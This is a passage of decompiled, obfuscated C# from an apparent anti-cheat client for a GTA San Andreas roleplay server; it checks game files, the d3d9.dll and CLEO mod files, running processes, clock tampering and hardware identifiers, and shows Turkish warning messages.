		// Token: 0x060000F4 RID: 244 RVA: 0x00008C64 File Offset: 0x00006E64
		private int FlushRef(int row_reference)
		{
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT ParentProcessId FROM Win32_Process WHERE ProcessId = " + row_reference.ToString()))
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						ManagementObject managementObject = managementObjectCollection.Cast<ManagementObject>().FirstOrDefault<ManagementObject>();
						if (managementObject != null)
						{
							return (int)managementObject["ParentProcessId"];
						}
					}
				}
			}
			catch
			{
				return -1;
			}
			return 0;
		}

		// Token: 0x060000F5 RID: 245 RVA: 0x00002CC2 File Offset: 0x00000EC2
		private void CalcRef(object sender, FormClosingEventArgs e)
		{
			MapperRef.ResolveSingleton(213);
			base.Hide();
			Application.Exit();
		}

		// Token: 0x060000F6 RID: 246 RVA: 0x00008CFC File Offset: 0x00006EFC
		private void PrepareRef(object sender, FormClosedEventArgs e)
		{
			this.m_RuleRef.ForgotReader(this.workerRef.Text);
			try
			{
				Process.GetCurrentProcess().Kill();
			}
			catch
			{
			}
		}

		// Token: 0x060000F7 RID: 247 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void DeleteRef(object sender, EventArgs e)
		{
		}

		// Token: 0x060000F8 RID: 248 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void CallRef(object sender, EventArgs e)
		{
		}

		// Token: 0x060000F9 RID: 249 RVA: 0x00002CDA File Offset: 0x00000EDA
		private void RateRef(object sender, MouseEventArgs e)
		{
			this._RefRef = 1;
			this._IdentifierRef = e.X;
			this.readerRef = e.Y;
		}

		// Token: 0x060000FA RID: 250 RVA: 0x00002CFB File Offset: 0x00000EFB
		private void ValidateRef(object sender, MouseEventArgs e)
		{
			this._RefRef = 0;
		}

		// Token: 0x060000FB RID: 251 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void VerifyRef(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x060000FC RID: 252 RVA: 0x00002D04 File Offset: 0x00000F04
		private void PopRef(object sender, EventArgs e)
		{
			Process.Start("https://www.facebook.com/rinaroleplay/");
		}

		// Token: 0x060000FD RID: 253 RVA: 0x00002D11 File Offset: 0x00000F11
		private void FillRef(object sender, EventArgs e)
		{
			Process.Start("https://www.youtube.com/channel/UCnNvd_LWorIx1gifAYD9iZQ");
		}

		// Token: 0x060000FE RID: 254 RVA: 0x00002D1E File Offset: 0x00000F1E
		private void DisableRef(object sender, EventArgs e)
		{
			Process.Start("https://www.instagram.com/rinaroleplay/");
		}

		// Token: 0x060000FF RID: 255 RVA: 0x00002D2B File Offset: 0x00000F2B
		private void EnableRef(object sender, EventArgs e)
		{
			Process.Start("https://www.rina-roleplay.com/discord");
		}

		// Token: 0x06000100 RID: 256 RVA: 0x00008D40 File Offset: 0x00006F40
		public static long CheckRef(string config)
		{
			string[] files = Directory.GetFiles(config, "*.*");
			long num = 0L;
			string[] array = files;
			for (int i = 0; i < array.Length; i++)
			{
				FileInfo fileInfo = new FileInfo(array[i]);
				num += fileInfo.Length;
			}
			return num;
		}

		// Token: 0x06000101 RID: 257 RVA: 0x00008D84 File Offset: 0x00006F84
		private bool TestRef(string reference, FileAccess caller)
		{
			bool result;
			try
			{
				new FileStream(reference, FileMode.Open, caller).Close();
				result = false;
			}
			catch (IOException)
			{
				result = true;
			}
			catch (Exception)
			{
				throw;
			}
			return result;
		}

		// Token: 0x06000102 RID: 258 RVA: 0x00008DC8 File Offset: 0x00006FC8
		public static bool DestroyRef(string value)
		{
			FileStream fileStream = null;
			bool result;
			try
			{
				fileStream = File.Open(value, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
				return false;
			}
			catch (UnauthorizedAccessException)
			{
				try
				{
					fileStream = File.Open(value, FileMode.Open, FileAccess.Read, FileShare.None);
				}
				catch (Exception)
				{
					return true;
				}
				return false;
			}
			catch (Exception)
			{
				result = true;
			}
			finally
			{
				if (fileStream != null)
				{
					fileStream.Close();
				}
			}
			return result;
		}

		// Token: 0x06000103 RID: 259 RVA: 0x00008E40 File Offset: 0x00007040
		public int CloneRef()
		{
			if (File.Exists(MapperRef.fieldRef + "\\d3d9.dll"))
			{
				bool flag = false;
				foreach (string text in Directory.EnumerateFiles(MapperRef.fieldRef, "d3d9.dll", SearchOption.TopDirectoryOnly))
				{
					flag = true;
				}
				bool flag2 = true;
				string[] files = Directory.GetFiles(MapperRef.fieldRef);
				for (int i = 0; i < files.Length; i++)
				{
					if (new FileInfo(files[i]).Name.ToUpper(new CultureInfo(MapperWatcherClass.VerifyRule(15, "en-US"), false)) == "D3D9.DLL")
					{
						flag2 = false;
					}
				}
				if (!flag || flag2)
				{
					this.label_0.ForeColor = Color.Red;
					this.label_0.Text = "D3D9.DLL dosyanız korunduğu için oyun başlatılamıyor.";
					return 1;
				}
			}
			if (Directory.Exists(MapperRef.fieldRef + "\\cleo"))
			{
				int i;
				foreach (string fileName in Directory.EnumerateFiles(MapperRef.fieldRef + "\\cleo", "*.cs", SearchOption.TopDirectoryOnly))
				{
					string text2 = new FileInfo(fileName).Name.ToUpper(new CultureInfo(MapperWatcherClass.VerifyRule(15, "en-US"), false));
					bool flag3 = false;
					string[] files = Directory.GetFiles(MapperRef.fieldRef + "\\cleo");
					for (i = 0; i < files.Length; i++)
					{
						if (new FileInfo(files[i]).Name.ToUpper(new CultureInfo(MapperWatcherClass.VerifyRule(15, "en-US"), false)) == text2)
						{
							flag3 = true;
						}
					}
					if (!flag3)
					{
						this.label_0.ForeColor = Color.Red;
						this.label_0.Text = "Gizli CLEO dosyanız var. (" + text2 + ")";
						return 1;
					}
				}
				using (IEnumerator<string> enumerator = Directory.EnumerateFiles(MapperRef.fieldRef + "\\cleo", "*.cleo", SearchOption.TopDirectoryOnly).GetEnumerator())
				{
					while (enumerator.MoveNext())
					{
						string fileName2 = enumerator.Current;
						string text3 = new FileInfo(fileName2).Name.ToUpper(new CultureInfo(MapperWatcherClass.VerifyRule(15, "en-US"), false));
						bool flag4 = false;
						string[] files = Directory.GetFiles(MapperRef.fieldRef + "\\cleo");
						for (int j = 0; j < files.Length; j++)
						{
							if (new FileInfo(files[j]).Name.ToUpper(new CultureInfo(MapperWatcherClass.VerifyRule(15, "en-US"), false)) == text3)
							{
								flag4 = true;
							}
						}
						if (!flag4)
						{
							this.label_0.ForeColor = Color.Red;
							this.label_0.Text = "Gizli CLEO dosyanız var. (" + text3 + ")";
							return 1;
						}
					}
					return 0;
				}
				return i;
			}
			return 0;
		}

		// Token: 0x06000104 RID: 260 RVA: 0x00002D38 File Offset: 0x00000F38
		public static bool NewRef(string task)
		{
			return Process.GetProcessesByName(task).FirstOrDefault(new Func<Process, bool>(Dispatcher.<>c.m_MockRef.RestartReader)) != null;
		}

		// Token: 0x06000105 RID: 261 RVA: 0x0000914C File Offset: 0x0000734C
		public static long VisitRef()
		{
			return (long)(DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0)).TotalSeconds;
		}

		// Token: 0x06000106 RID: 262 RVA: 0x0000917C File Offset: 0x0000737C
		public static string LogoutRef(string config)
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < config.Length; i++)
			{
				if ((config[i] >= '0' && config[i] <= '9') || (config[i] >= 'A' && config[i] <= 'z') || config[i] == '.' || config[i] == '_')
				{
					stringBuilder.Append(config[i]);
				}
			}
			return stringBuilder.ToString();
		}

		// Token: 0x06000107 RID: 263 RVA: 0x000091F8 File Offset: 0x000073F8
		public static string UpdateRef(string key)
		{
			byte[] bytes = Convert.FromBase64String(key);
			return Encoding.UTF8.GetString(bytes);
		}

		// Token: 0x06000108 RID: 264 RVA: 0x00009218 File Offset: 0x00007418
		public static string CalculateRef(string spec)
		{
			string result = "";
			try
			{
				result = Convert.ToBase64String(Encoding.UTF8.GetBytes(spec));
			}
			catch
			{
			}
			return result;
		}

		// Token: 0x06000109 RID: 265 RVA: 0x00009254 File Offset: 0x00007454
		private string PatchRef()
		{
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			FileStream fileStream = new FileStream(Process.GetCurrentProcess().MainModule.FileName, FileMode.Open, FileAccess.Read);
			md5CryptoServiceProvider.ComputeHash(fileStream);
			fileStream.Close();
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < md5CryptoServiceProvider.Hash.Length; i++)
			{
				stringBuilder.Append(md5CryptoServiceProvider.Hash[i].ToString("x2"));
			}
			return stringBuilder.ToString().ToUpperInvariant();
		}

		// Token: 0x0600010A RID: 266 RVA: 0x000092D0 File Offset: 0x000074D0
		private static string ResolveRef()
		{
			object[] selection = new object[0];
			object[] array = TaskReader.TestRule(9, selection, null);
			return (string)array[0];
		}

		// Token: 0x0600010B RID: 267 RVA: 0x00009300 File Offset: 0x00007500
		private static string CancelRef(string reference)
		{
			HashAlgorithm hashAlgorithm = new MD5CryptoServiceProvider();
			byte[] bytes = Encoding.ASCII.GetBytes(reference);
			return Dispatcher.ViewRef(hashAlgorithm.ComputeHash(bytes));
		}

		// Token: 0x0600010C RID: 268 RVA: 0x0000932C File Offset: 0x0000752C
		private static string ViewRef(IList<byte> info)
		{
			string text = string.Empty;
			for (int i = 0; i < info.Count; i++)
			{
				byte b = info[i];
				int num = (int)(b & 15);
				int num2 = b >> 4 & 15;
				if (num2 > 9)
				{
					text += ((char)(num2 - 10 + 65)).ToString(CultureInfo.InvariantCulture);
				}
				else
				{
					text += num2.ToString(CultureInfo.InvariantCulture);
				}
				if (num > 9)
				{
					text += ((char)(num - 10 + 65)).ToString(CultureInfo.InvariantCulture);
				}
				else
				{
					text += num.ToString(CultureInfo.InvariantCulture);
				}
				if (i + 1 != info.Count && (i + 1) % 2 == 0)
				{
					text += "-";
				}
			}
			return text;
		}

		// Token: 0x0600010D RID: 269 RVA: 0x000093F8 File Offset: 0x000075F8
		private static string IncludeRef(string reference, string caller, string third)
		{
			string text = "";
			string result;
			try
			{
				foreach (ManagementBaseObject managementBaseObject in new ManagementClass(reference).GetInstances())
				{
					if (!(managementBaseObject[third].ToString() != "True") && !(text != ""))
					{
						text = managementBaseObject[caller].ToString();
						break;
					}
				}
				return text;
			}
			catch
			{
				result = "FAILED";
			}
			return result;
		}

		// Token: 0x0600010E RID: 270 RVA: 0x00009498 File Offset: 0x00007698
		private static string RunRef(string def, string counter)
		{
			string text = "";
			string result;
			try
			{
				foreach (ManagementBaseObject managementBaseObject in new ManagementClass(def).GetInstances())
				{
					if (!(text != ""))
					{
						text = managementBaseObject[counter].ToString();
						break;
					}
				}
				return text;
			}
			catch
			{
				result = "FAILED";
			}
			return result;
		}

		// Token: 0x0600010F RID: 271 RVA: 0x00009520 File Offset: 0x00007720
		private static string FindRef()
		{
			object[] selection = new object[0];
			object[] array = TaskReader.TestRule(10, selection, null);
			return (string)array[0];
		}

		// Token: 0x06000110 RID: 272 RVA: 0x00009550 File Offset: 0x00007750
		private static string ConcatRef()
		{
			return string.Concat(new string[]
			{
				Dispatcher.RunRef("Win32_BIOS", "Manufacturer"),
				Dispatcher.RunRef("Win32_BIOS", "SMBIOSBIOSVersion"),
				Dispatcher.RunRef("Win32_BIOS", "IdentificationCode"),
				Dispatcher.RunRef("Win32_BIOS", "SerialNumber"),
				Dispatcher.RunRef("Win32_BIOS", "ReleaseDate"),
				Dispatcher.RunRef("Win32_BIOS", "Version")
			});
		}

		// Token: 0x06000111 RID: 273 RVA: 0x000095D4 File Offset: 0x000077D4
		private static string MapRef()
		{
			return Dispatcher.RunRef("Win32_DiskDrive", "Model") + Dispatcher.RunRef("Win32_DiskDrive", "Manufacturer") + Dispatcher.RunRef("Win32_DiskDrive", "Signature") + Dispatcher.RunRef("Win32_DiskDrive", "TotalHeads");
		}

		// Token: 0x06000112 RID: 274 RVA: 0x00009624 File Offset: 0x00007824
		private static string ReadRef()
		{
			return Dispatcher.RunRef("Win32_BaseBoard", "Model") + Dispatcher.RunRef("Win32_BaseBoard", "Manufacturer") + Dispatcher.RunRef("Win32_BaseBoard", "Name") + Dispatcher.RunRef("Win32_BaseBoard", "SerialNumber");
		}

		// Token: 0x06000113 RID: 275 RVA: 0x00002D67 File Offset: 0x00000F67
		private static string ForgotRef()
		{
			return Dispatcher.RunRef("Win32_VideoController", "DriverVersion") + Dispatcher.RunRef("Win32_VideoController", "Name");
		}

		// Token: 0x06000114 RID: 276 RVA: 0x00009674 File Offset: 0x00007874
		protected void RevertRef(ref string task, ref string pol, ref string c, ref string ord2)
		{
			object[] array = TaskReader.TestRule(11, new object[]
			{
				task,
				pol,
				c,
				ord2
			}, this);
			task = (string)array[0];
			pol = (string)array[1];
			c = (string)array[2];
			ord2 = (string)array[3];
		}

		// Token: 0x06000115 RID: 277 RVA: 0x00009710 File Offset: 0x00007910
		private string QueryIdentifier(int indexOfi)
		{
			if (!ProductReaderStructBuilder.m_MappingIdentifier.ContainsKey(indexOfi))
			{
				string result;
				try
				{
					string text = Dispatcher.AddIdentifier(indexOfi);
					ProductReaderStructBuilder.m_MappingIdentifier[indexOfi] = text;
					result = text;
				}
				catch
				{
					result = null;
				}
				return result;
			}
			return ProductReaderStructBuilder.m_MappingIdentifier[indexOfi];
		}

		// Token: 0x06000116 RID: 278 RVA: 0x00009764 File Offset: 0x00007964
		public static string AddIdentifier(int firstsize)
		{
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT ProcessId, ExecutablePath FROM Win32_Process WHERE ProcessId = " + firstsize.ToString()))
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						ManagementObject managementObject = managementObjectCollection.Cast<ManagementObject>().FirstOrDefault<ManagementObject>();
						if (managementObject != null)
						{
							return (string)managementObject["ExecutablePath"];
						}
					}
				}
			}
			catch
			{
				return null;
			}
			return null;
		}

		// Token: 0x06000117 RID: 279 RVA: 0x000097FC File Offset: 0x000079FC
		private string ExcludeIdentifier(int first_offset, string reg)
		{
			try
			{
				using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(string.Concat(new string[]
				{
					"SELECT ProcessId, ExecutablePath FROM Win32_Process WHERE ProcessId = ",
					first_offset.ToString(),
					" AND Caption = '",
					reg,
					"'"
				})))
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						ManagementObject managementObject = managementObjectCollection.Cast<ManagementObject>().FirstOrDefault<ManagementObject>();
						if (managementObject != null)
						{
							return (string)managementObject["ExecutablePath"];
						}
					}
				}
			}
			catch
			{
				return null;
			}
			return null;
		}

		// Token: 0x06000118 RID: 280 RVA: 0x00002D8C File Offset: 0x00000F8C
		private void InstantiateIdentifier(object sender, EventArgs e)
		{
			MessageBox.Show("Kullandığınız program, Rina Roleplay oyun sunucusu için @Hera tarafından kodlanmıştır.\n\nTüm hakları Rina Roleplay'a aittir.");
		}

		// Token: 0x06000119 RID: 281 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void InterruptIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x0600011A RID: 282 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void PushIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x0600011B RID: 283 RVA: 0x000098B4 File Offset: 0x00007AB4
		private void StartIdentifier(object sender, EventArgs e)
		{
			new StringBuilder();
			int num = 1;
			foreach (Process process in Process.GetProcesses("."))
			{
				try
				{
					if (process.MainWindowTitle.Length > 0)
					{
						if (process.MainWindowTitle.Contains("GTA: San Andreas") || process.MainWindowTitle.Contains("GTA:SA:MP"))
						{
							Process.GetProcessesByName(process.MainWindowTitle.ToString());
							this.label_0.Text = "Oyun açıkken client açık olmak zorundadır. Bu işlemi yapabilmek için ilk önce oyunu kapatmalısınız.";
							this.label_0.ForeColor = Color.Orange;
							return;
						}
						num++;
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.ToString());
				}
			}
			this.label_0.Text = "Client kapatılıyor...";
			this.label_0.ForeColor = Color.Red;
			base.Close();
			Application.Exit();
		}

		// Token: 0x0600011C RID: 284 RVA: 0x000099A0 File Offset: 0x00007BA0
		public void PublishIdentifier()
		{
			string a = "";
			string a2 = "";
			string a3 = new FileInfo(MapperRef.fieldRef + "\\gta_sa.exe").LastWriteTime.ToString();
			string a4 = new FileInfo(MapperRef.fieldRef + "\\samp.exe").LastWriteTime.ToString();
			if (Directory.Exists(MapperRef.fieldRef + "\\cleo"))
			{
				a = new DirectoryInfo(MapperRef.fieldRef + "\\cleo").LastWriteTime.ToString();
				a2 = MapperRef.DeleteSingleton(MapperRef.fieldRef + "\\cleo");
			}
			if (a3 != ProductReaderStructBuilder._PoolIdentifier)
			{
				MapperRef.PatchSingleton(423);
				MapperRef.composerRef = false;
				OrderVisitorException.TestReader("Oyun dosyalarında değişiklik tespit edildiği için oyun kapatıldı. (c4)", "Rina Anti-Cheat");
			}
			if (a4 != ProductReaderStructBuilder.mapperIdentifier)
			{
				MapperRef.PatchSingleton(423);
				MapperRef.composerRef = false;
				OrderVisitorException.TestReader("Oyun dosyalarında değişiklik tespit edildiği için oyun kapatıldı. (c5)", "Rina Anti-Cheat");
			}
			if (a != ProductReaderStructBuilder._FieldIdentifier && !string.IsNullOrEmpty(ProductReaderStructBuilder._FieldIdentifier))
			{
				MapperRef.PatchSingleton(423);
				MapperRef.composerRef = false;
				OrderVisitorException.TestReader("CLEO klasörünüzde değişiklik tespit edildiği için oyun kapatıldı.", "Rina Anti-Cheat");
				MapperRef.CreateSingleton("CLEO folder change detected.");
				MapperRef.NewSingleton("CLEO-EDITED", "", "", "", 0);
			}
			if (a2 != ProductReaderStructBuilder.facadeIdentifier && !string.IsNullOrEmpty(ProductReaderStructBuilder.facadeIdentifier))
			{
				MapperRef.PatchSingleton(423);
				MapperRef.composerRef = false;
				OrderVisitorException.TestReader("CLEO klasörünüzde değişiklik tespit edildiği için oyun kapatıldı.", "Rina Anti-Cheat");
				MapperRef.CreateSingleton("CLEO folder change detected.");
				MapperRef.NewSingleton("CLEO-EDITED-H", "", "", "", 0);
			}
		}

		// Token: 0x0600011D RID: 285 RVA: 0x00009B5C File Offset: 0x00007D5C
		public bool ResetIdentifier()
		{
			foreach (Process process in Process.GetProcesses("."))
			{
				try
				{
					if (process.MainWindowTitle.Length > 0 && (process.MainWindowTitle.Contains("GTA: San Andreas") || process.MainWindowTitle.Contains("GTA:SA:MP")))
					{
						if (Dispatcher.value == 1L)
						{
							Dispatcher.value = 0L;
							this.PublishIdentifier();
							Dispatcher.adapter = 0L;
						}
						return true;
					}
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.ToString());
				}
			}
			return false;
		}

		// Token: 0x0600011E RID: 286 RVA: 0x00009C18 File Offset: 0x00007E18
		public static Process SelectIdentifier()
		{
			foreach (Process process in Process.GetProcesses("."))
			{
				try
				{
					if (process.MainWindowTitle.Length > 0 && (process.MainWindowTitle.Contains("GTA: San Andreas") || process.MainWindowTitle.Contains("GTA:SA:MP") || process.ProcessName == "gta_sa"))
					{
						return process;
					}
				}
				catch
				{
				}
			}
			return null;
		}

		// Token: 0x0600011F RID: 287 RVA: 0x00009CA4 File Offset: 0x00007EA4
		public static string InitIdentifier()
		{
			foreach (Process process in Process.GetProcesses("."))
			{
				try
				{
					if (process.MainWindowTitle.Length > 0 && (process.MainWindowTitle.Contains("GTA: San Andreas") || process.MainWindowTitle.Contains("GTA:SA:MP")))
					{
						return process.ProcessName;
					}
				}
				catch
				{
				}
			}
			return "null";
		}

		// Token: 0x06000120 RID: 288 RVA: 0x00009D28 File Offset: 0x00007F28
		protected void PrintIdentifier()
		{
			object[] selection = new object[0];
			TaskReader.TestRule(12, selection, this);
		}

		// Token: 0x06000121 RID: 289 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void CountIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x06000122 RID: 290 RVA: 0x00009D50 File Offset: 0x00007F50
		private void StopIdentifier(object sender, EventArgs e)
		{
			foreach (ProductReaderStructBuilder.RepositoryIdentifier repositoryIdentifier in ProductReaderStructBuilder.dispatcherIdentifier)
			{
				MessageBox.Show(repositoryIdentifier._PageIdentifier);
			}
		}

		// Token: 0x06000123 RID: 291 RVA: 0x0000914C File Offset: 0x0000734C
		public static long MoveIdentifier()
		{
			return (long)(DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0)).TotalSeconds;
		}

		// Token: 0x06000124 RID: 292 RVA: 0x00009DA8 File Offset: 0x00007FA8
		protected void SearchIdentifier()
		{
			if (Dispatcher.MoveIdentifier() > Dispatcher.m_Composer + 30L)
			{
				MapperRef.PatchSingleton(386);
				this.label_0.Text = "Hafıza kontrolü bozuldu.";
				this.label_0.ForeColor = Color.Red;
				MapperRef.NewSingleton("KILLMEMORYTHREAD", "", "", "", 0);
			}
			if (Dispatcher.MoveIdentifier() > Dispatcher.m_Listener + 180L)
			{
				MapperRef.PatchSingleton(385);
				this.label_0.Text = "İşlem kontrolü bozuldu.";
				this.label_0.ForeColor = Color.Red;
				MapperRef.NewSingleton("KILLPROCESSTHREAD", "", "", "", 0);
			}
			if (Dispatcher.MoveIdentifier() > ProductReaderStructBuilder.long_0 + 180L)
			{
				MapperRef.PatchSingleton(384);
				this.label_0.Text = "Dosya kontrolü bozuldu.";
				this.label_0.ForeColor = Color.Red;
				MapperRef.NewSingleton("KILLFILETHREAD", "", "", "", 0);
			}
			if (this.ResetIdentifier())
			{
				this.PrintIdentifier();
				Process process = Dispatcher.SelectIdentifier();
				if (process != null)
				{
					string text = null;
					try
					{
						text = this.ExcludeIdentifier(process.Id, "gta_sa.exe");
					}
					catch
					{
						text = null;
					}
					if (MapperRef.fieldRef + "\\gta_sa.exe" != text && !string.IsNullOrEmpty(text) && Dispatcher.MoveIdentifier() > Dispatcher._Filter)
					{
						MapperRef.PatchSingleton(3);
						OrderVisitorException.TestReader(string.Concat(new string[]
						{
							"Oyun yolu açığı tespit edildiği için oyun ve client kapatılıyor! (c4)\n\nPNAME: ",
							process.ProcessName,
							"\nPID: ",
							process.Id.ToString(),
							"\nA: ",
							MapperRef.fieldRef,
							"\\gta_sa.exe\nB: ",
							text
						}), "Rina Anti-Cheat");
					}
				}
				if (File.Exists(MapperRef.fieldRef + "/d3d9.dll") && !MapperRef.composerRef)
				{
					MapperRef.PatchSingleton(4);
					MapperRef.composerRef = false;
					OrderVisitorException.TestReader("Oyun dosyalarında değişiklik tespit edildiği için oyun kapatıldı. (c3)", "Rina Anti-Cheat");
				}
				if (Directory.Exists(MapperRef.fieldRef + "\\cleo") != ProductReaderStructBuilder.m_ComposerIdentifier)
				{
					MapperRef.PatchSingleton(5);
					OrderVisitorException.TestReader("CLEO klasörünüzde değişiklik tespit edildi. (c1)", "Rina Anti-Cheat");
				}
				else if (ProductReaderStructBuilder.m_ComposerIdentifier)
				{
					File.GetLastWriteTime(MapperRef.fieldRef + "\\cleo");
				}
			}
			if (this.CloneRef() == 1)
			{
				MapperRef.PatchSingleton(5);
				OrderVisitorException.TestReader("Oyun dosyalarında değişiklik tespit edildiği için oyun kapatıldı. (c2)", "Rina Anti-Cheat");
			}
			if (!File.Exists(MapperRef.fieldRef + "/d3d9.dll") && MapperRef.composerRef)
			{
				MapperRef.PatchSingleton(6);
				MapperRef.composerRef = false;
				OrderVisitorException.TestReader("Oyun dosyalarında değişiklik tespit edildiği için oyun kapatıldı. (c1)", "Rina Anti-Cheat");
			}
		}

		// Token: 0x06000125 RID: 293 RVA: 0x0000A07C File Offset: 0x0000827C
		private void ConnectIdentifier(object sender, EventArgs e)
		{
			if (Dispatcher.m_Stub == 0L)
			{
				Dispatcher.m_Stub = Dispatcher.MoveIdentifier() + (long)(Dispatcher._Mapping * 60);
			}
			else if (Dispatcher.MoveIdentifier() > Dispatcher.m_Stub)
			{
				ProductReaderStructBuilder.m_StatusIdentifier.Clear();
				ProductReaderStructBuilder.m_MappingIdentifier.Clear();
				Dispatcher.m_Stub = Dispatcher.MoveIdentifier() + (long)(Dispatcher._Mapping * 60);
			}
			if (!this.serverRef.IsBusy)
			{
				this.serverRef.RunWorkerAsync();
			}
		}

		// Token: 0x06000126 RID: 294 RVA: 0x00002D99 File Offset: 0x00000F99
		private void SetupIdentifier(object sender, EventArgs e)
		{
			if (base.WindowState != FormWindowState.Minimized)
			{
				base.Hide();
				base.WindowState = FormWindowState.Minimized;
				this.containerRef.Visible = true;
			}
		}

		// Token: 0x06000127 RID: 295 RVA: 0x00002DBD File Offset: 0x00000FBD
		private void GetIdentifier(object sender, MouseEventArgs e)
		{
			this.PostIdentifier();
		}

		// Token: 0x06000128 RID: 296 RVA: 0x00002DC5 File Offset: 0x00000FC5
		public void PostIdentifier()
		{
			if (base.WindowState == FormWindowState.Minimized)
			{
				base.Show();
				base.WindowState = FormWindowState.Normal;
				this.containerRef.Visible = false;
			}
		}

		// Token: 0x06000129 RID: 297 RVA: 0x0000A0F4 File Offset: 0x000082F4
		private void OrderIdentifier(object sender, EventArgs e)
		{
			if (MapperRef.composerRef)
			{
				this._InvocationRef.Stop();
				return;
			}
			if (!File.Exists(MapperRef.fieldRef + "\\d3d9.dll"))
			{
				MapperRef.composerRef = false;
			}
			else
			{
				MapperRef.composerRef = true;
			}
			if (MapperRef.composerRef)
			{
				this.label_0.Text = "Oyun çalıştırıldı. (D3D9 entegreli)";
			}
			this.m_RuleRef._ProxyRef++;
			if (this.m_RuleRef._ProxyRef >= 10)
			{
				this.PublishIdentifier();
				this._InvocationRef.Stop();
				return;
			}
			this._InvocationRef.Start();
		}

		// Token: 0x0600012A RID: 298 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void AssetIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x0600012B RID: 299 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void DefineIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x0600012C RID: 300 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void CollectIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x0600012D RID: 301 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void ListIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x0600012E RID: 302 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void RestartIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x0600012F RID: 303 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void ReflectIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x06000130 RID: 304 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void InsertIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x06000131 RID: 305 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void RemoveIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x06000132 RID: 306 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void RegisterIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x06000133 RID: 307 RVA: 0x00002BF0 File Offset: 0x00000DF0
		private void WriteIdentifier(object sender, EventArgs e)
		{
		}

		// Token: 0x06000134 RID: 308 RVA: 0x00002DE9 File Offset: 0x00000FE9
		private void ManageIdentifier(object sender, DoWorkEventArgs e)
		{
			this.SearchIdentifier();
		}

		// Token: 0x06000135 RID: 309 RVA: 0x00002DF1 File Offset: 0x00000FF1
		private void CompareIdentifier()
		{
			ProductReaderStructBuilder.errorIdentifier = 0;
			this.m_RuleRef.SortSingleton();
		}

		// Token: 0x06000136 RID: 310 RVA: 0x0000A190 File Offset: 0x00008390
		private void ComputeIdentifier(object sender, DoWorkEventArgs e)
		{
			BackgroundWorker backgroundWorker = sender as BackgroundWorker;
			int millisecondsTimeout = 1000;
			while (!backgroundWorker.CancellationPending)
			{
				if (Dispatcher.value == 1L && this.CloneRef() == 1)
				{
					MapperRef.PatchSingleton(5);
					OrderVisitorException.TestReader("Oyun dosyalarında değişiklik tespit edildiği için oyun kapatıldı. (c2)", "Rina Anti-Cheat");
				}
				if (File.Exists(MapperRef.fieldRef + "\\d3d9.dll"))
				{
					int num = 0;
					long length = new FileInfo(MapperRef.fieldRef + "\\d3d9.dll").Length;
					using (List<ProductReaderStructBuilder.InvocationWatcherLicense>.Enumerator enumerator = ProductReaderStructBuilder._ConfigIdentifier.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							ProductReaderStructBuilder.InvocationWatcherLicense invocationWatcherLicense = enumerator.Current;
							string a = MappingRef.FlushReader(MapperRef.fieldRef + "\\d3d9.dll");
							string a2 = MappingRef.CalcReader(MapperRef.fieldRef + "\\d3d9.dll");
							if (length == invocationWatcherLicense._ReaderReader && a == invocationWatcherLicense.refReader && a2 == invocationWatcherLicense._IdentifierReader)
							{
								num = 1;
								break;
							}
						}
						goto IL_225;
					}
					IL_10F:
					MapperRef.PatchSingleton(20);
					OrderVisitorException.TestReader("İzinsiz D3D9.dll bulundu.\n\nGTA-SA'nın kurulu olduğu klasör içerisinde bulunan D3D9.dll dosyasını silerek sorunu çözebilirsiniz.", "Rina Anti-Cheat");
					goto IL_126;
					IL_225:
					if (num == 0)
					{
						goto IL_10F;
					}
				}
				IL_126:
				long num2 = Dispatcher.MoveIdentifier();
				if (Dispatcher.status != 0L && Dispatcher.status > num2)
				{
					MapperRef.PatchSingleton(2312);
					this.label_0.ForeColor = Color.Red;
					this.label_0.Text = "Saat & tarih ayarlarınızda problem bulunduğu için oyun kapatıldı.";
					MapperRef.CreateSingleton("Time Hack detected. CODE: 1 OLDTIME: " + Dispatcher.status.ToString() + " NEWTIME: " + num2.ToString());
				}
				if (Dispatcher.status == num2)
				{
					ProductReaderStructBuilder.listenerIdentifier++;
					if (ProductReaderStructBuilder.listenerIdentifier >= 15)
					{
